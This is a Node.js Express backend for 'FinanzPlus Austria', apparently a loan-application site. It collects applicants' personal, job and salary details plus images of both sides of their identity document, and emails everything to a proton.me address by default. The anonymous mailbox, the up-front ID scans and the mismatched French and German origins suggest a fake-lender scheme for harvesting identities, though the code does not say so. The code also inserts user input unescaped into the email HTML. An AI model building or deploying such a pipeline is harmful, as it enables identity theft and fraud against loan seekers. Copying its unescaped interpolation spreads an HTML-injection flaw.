const express = require('express');
const cors = require('cors');
const multer = require('multer');
const nodemailer = require('nodemailer');
const path = require('path');
const fs = require('fs');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Configuration de Multer pour l'upload de fichiers
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, 'uploads/');
  },
  filename: (req, file, cb) => {
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
    cb(null, file.fieldname + '-' + uniqueSuffix + path.extname(file.originalname));
  }
});

// Validation des types de fichiers
const fileFilter = (req, file, cb) => {
  const allowed = ['.pdf', '.jpg', '.jpeg', '.png'];
  const ext = path.extname(file.originalname).toLowerCase();
  if (allowed.includes(ext)) {
    cb(null, true);
  } else {
    cb(new Error('Format de fichier non autorisé. Formats acceptés: PDF, JPG, PNG'));
  }
};

const upload = multer({
  storage: storage,
  fileFilter: fileFilter,
  limits: {
    fileSize: 10 * 1024 * 1024 // 10 Mo max
  }
});

// Configuration de Nodemailer — T-online SMTP
const transporter = nodemailer.createTransport({
  host: process.env.EMAIL_HOST || 'securesmtp.t-online.de',
  port: parseInt(process.env.EMAIL_PORT) || 587,
  secure: false, // STARTTLS sur le port 587
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS
  },
  tls: {
    rejectUnauthorized: true
  }
});

// Route de test
app.get('/', (req, res) => {
  res.json({ message: 'API FinanzPlus Austria - Serveur actif' });
});

// Route pour soumettre le formulaire
// Accepte deux fichiers : rectoFile (Vorderseite) et versoFile (Rückseite)
app.post(
  '/api/submit-application',
  upload.fields([
    { name: 'rectoFile', maxCount: 1 },
    { name: 'versoFile', maxCount: 1 }
  ]),
  async (req, res) => {
    try {
      const {
        nom,
        prenom,
        age,
        sexe,
        adresse,
        telephone,
        travail,
        salaireMensuel,
        accepteConfidentialite
      } = req.body;

      // Validation des champs obligatoires
      if (!nom || !prenom || !age || !sexe || !adresse || !telephone || !travail || !salaireMensuel) {
        return res.status(400).json({
          success: false,
          message: 'Alle Pflichtfelder müssen ausgefüllt werden.'
        });
      }

      if (accepteConfidentialite !== 'true') {
        return res.status(400).json({
          success: false,
          message: 'Sie müssen die Vertraulichkeitsklausel akzeptieren.'
        });
      }

      // Vérification des deux fichiers
      const rectoDoc = req.files && req.files['rectoFile'] && req.files['rectoFile'][0];
      const versoDoc = req.files && req.files['versoFile'] && req.files['versoFile'][0];

      if (!rectoDoc || !versoDoc) {
        return res.status(400).json({
          success: false,
          message: 'Beide Seiten des Ausweises (Vorderseite und Rückseite) sind erforderlich.'
        });
      }

      const isRectoImage = ['.jpg', '.jpeg', '.png'].includes(path.extname(rectoDoc.originalname).toLowerCase());
      const isVersoImage = ['.jpg', '.jpeg', '.png'].includes(path.extname(versoDoc.originalname).toLowerCase());

      // Préparation des pièces jointes
      const attachments = [
        {
          filename: `vorderseite_${nom}_${prenom}${path.extname(rectoDoc.originalname)}`,
          path: rectoDoc.path,
          ...(isRectoImage ? { cid: 'recto_doc' } : {})
        },
        {
          filename: `rueckseite_${nom}_${prenom}${path.extname(versoDoc.originalname)}`,
          path: versoDoc.path,
          ...(isVersoImage ? { cid: 'verso_doc' } : {})
        }
      ];

      // Préparation de l'email HTML
      const mailOptions = {
        from: process.env.EMAIL_USER,
        to: process.env.EMAIL_DEST || 'kontakt_finanzplusaustria@proton.me',
        subject: `Kreditantrag FinanzPlus Austria — ${prenom} ${nom}`,
        html: `
          <div style="font-family: Arial, sans-serif; max-width: 650px; margin: 0 auto; color: #1f2328;">
            <div style="background: #1a3a6e; padding: 30px; text-align: center; border-radius: 8px 8px 0 0;">
              <h1 style="color: white; margin: 0; font-size: 24px;">FinanzPlus Austria</h1>
              <p style="color: rgba(255,255,255,0.9); margin: 8px 0 0 0;">Neuer Kreditantrag eingegangen</p>
            </div>

            <div style="padding: 30px; background: #ffffff; border: 1px solid #e5e7eb; border-top: none;">

              <h2 style="color: #1a3a6e; border-bottom: 2px solid #e5e7eb; padding-bottom: 8px;">📋 Persönliche Informationen</h2>
              <table style="width: 100%; border-collapse: collapse; margin-bottom: 25px;">
                <tr>
                  <td style="padding: 10px 12px; background: #f7f8fa; font-weight: 600; width: 40%; border: 1px solid #e5e7eb;">Nachname</td>
                  <td style="padding: 10px 12px; border: 1px solid #e5e7eb;">${nom}</td>
                </tr>
                <tr>
                  <td style="padding: 10px 12px; background: #f7f8fa; font-weight: 600; border: 1px solid #e5e7eb;">Vorname</td>
                  <td style="padding: 10px 12px; border: 1px solid #e5e7eb;">${prenom}</td>
                </tr>
                <tr>
                  <td style="padding: 10px 12px; background: #f7f8fa; font-weight: 600; border: 1px solid #e5e7eb;">Alter</td>
                  <td style="padding: 10px 12px; border: 1px solid #e5e7eb;">${age} Jahre</td>
                </tr>
                <tr>
                  <td style="padding: 10px 12px; background: #f7f8fa; font-weight: 600; border: 1px solid #e5e7eb;">Geschlecht</td>
                  <td style="padding: 10px 12px; border: 1px solid #e5e7eb;">${sexe}</td>
                </tr>
                <tr>
                  <td style="padding: 10px 12px; background: #f7f8fa; font-weight: 600; border: 1px solid #e5e7eb;">Adresse</td>
                  <td style="padding: 10px 12px; border: 1px solid #e5e7eb;">${adresse}</td>
                </tr>
              </table>

              <h2 style="color: #1a3a6e; border-bottom: 2px solid #e5e7eb; padding-bottom: 8px;">📞 Kontaktdaten</h2>
              <table style="width: 100%; border-collapse: collapse; margin-bottom: 25px;">
                <tr>
                  <td style="padding: 10px 12px; background: #f7f8fa; font-weight: 600; width: 40%; border: 1px solid #e5e7eb;">Telefonnummer</td>
                  <td style="padding: 10px 12px; border: 1px solid #e5e7eb;">${telephone}</td>
                </tr>
              </table>

              <h2 style="color: #1a3a6e; border-bottom: 2px solid #e5e7eb; padding-bottom: 8px;">💼 Berufliche Informationen</h2>
              <table style="width: 100%; border-collapse: collapse; margin-bottom: 25px;">
                <tr>
                  <td style="padding: 10px 12px; background: #f7f8fa; font-weight: 600; width: 40%; border: 1px solid #e5e7eb;">Beruf</td>
                  <td style="padding: 10px 12px; border: 1px solid #e5e7eb;">${travail}</td>
                </tr>
                <tr>
                  <td style="padding: 10px 12px; background: #f7f8fa; font-weight: 600; border: 1px solid #e5e7eb;">Monatliches Gehalt</td>
                  <td style="padding: 10px 12px; border: 1px solid #e5e7eb;">${salaireMensuel} €</td>
                </tr>
              </table>

              <h2 style="color: #1a3a6e; border-bottom: 2px solid #e5e7eb; padding-bottom: 8px;">🪪 Ausweisdokument</h2>
              <p style="margin-bottom: 15px;">
                Beide Seiten des Ausweises sind als Anhang beigefügt:<br>
                • <strong>Vorderseite:</strong> ${rectoDoc.originalname}<br>
                • <strong>Rückseite:</strong> ${versoDoc.originalname}
              </p>
              ${isRectoImage ? `<p style="font-weight:600;margin:4px 0;">Vorderseite:</p><img src="cid:recto_doc" alt="Vorderseite" style="max-width: 100%; border: 1px solid #e5e7eb; border-radius: 6px; margin-bottom: 12px;" />` : ''}
              ${isVersoImage ? `<p style="font-weight:600;margin:4px 0;">Rückseite:</p><img src="cid:verso_doc" alt="Rückseite" style="max-width: 100%; border: 1px solid #e5e7eb; border-radius: 6px; margin-bottom: 20px;" />` : ''}

              <div style="background: #d1fae5; border-left: 4px solid #10b981; padding: 15px; border-radius: 0 6px 6px 0; margin-top: 10px;">
                <strong style="color: #065f46;">✅ Vertraulichkeitsklausel akzeptiert</strong>
                <p style="margin: 6px 0 0 0; font-size: 13px; color: #065f46;">
                  Der Antragsteller bestätigt, die Vertraulichkeitsvereinbarung zwischen ihm und FinanzPlus Austria gelesen und akzeptiert zu haben.
                </p>
              </div>
            </div>

            <div style="padding: 15px 30px; background: #f7f8fa; border: 1px solid #e5e7eb; border-top: none; border-radius: 0 0 8px 8px;">
              <p style="margin: 0; font-size: 12px; color: #57606a;">
                Einreichungsdatum: ${new Date().toLocaleString('de-DE', { timeZone: 'Europe/Berlin' })}
              </p>
            </div>
          </div>
        `,
        attachments
      };

      // Envoi de l'email
      await transporter.sendMail(mailOptions);

      // Suppression des fichiers temporaires après envoi
      try { fs.unlinkSync(rectoDoc.path); } catch (_) {}
      try { fs.unlinkSync(versoDoc.path); } catch (_) {}

      res.json({
        success: true,
        message: 'Ihr Antrag wurde erfolgreich eingereicht. Wir werden uns sehr bald bei Ihnen melden.'
      });

    } catch (error) {
      console.error('Fehler bei der Einreichung:', error);

      // Nettoyage des fichiers en cas d'erreur
      if (req.files) {
        ['rectoFile', 'versoFile'].forEach(field => {
          if (req.files[field] && req.files[field][0]) {
            try { fs.unlinkSync(req.files[field][0].path); } catch (_) {}
          }
        });
      }

      res.status(500).json({
        success: false,
        message: 'Ein Fehler ist bei der Einreichung aufgetreten. Bitte versuchen Sie es erneut.',
        error: error.message
      });
    }
  }
);

// Gestion des erreurs Multer
app.use((error, req, res, next) => {
  if (error instanceof multer.MulterError) {
    if (error.code === 'LIMIT_FILE_SIZE') {
      return res.status(400).json({
        success: false,
        message: 'Die Datei ist zu groß. Maximale Größe: 10 MB.'
      });
    }
  }

  res.status(500).json({
    success: false,
    message: error.message || 'Ein Fehler ist aufgetreten'
  });
});

// Démarrage du serveur
app.listen(PORT, () => {
  console.log(`🚀 Server FinanzPlus Austria gestartet auf Port ${PORT}`);
  console.log(`📧 Ziel-E-Mail: ${process.env.EMAIL_DEST || 'kontakt_finanzplusaustria@proton.me'}`);
  console.log(`📤 SMTP-Host: ${process.env.EMAIL_HOST || 'securesmtp.t-online.de'}`);
});

// Made with Bob
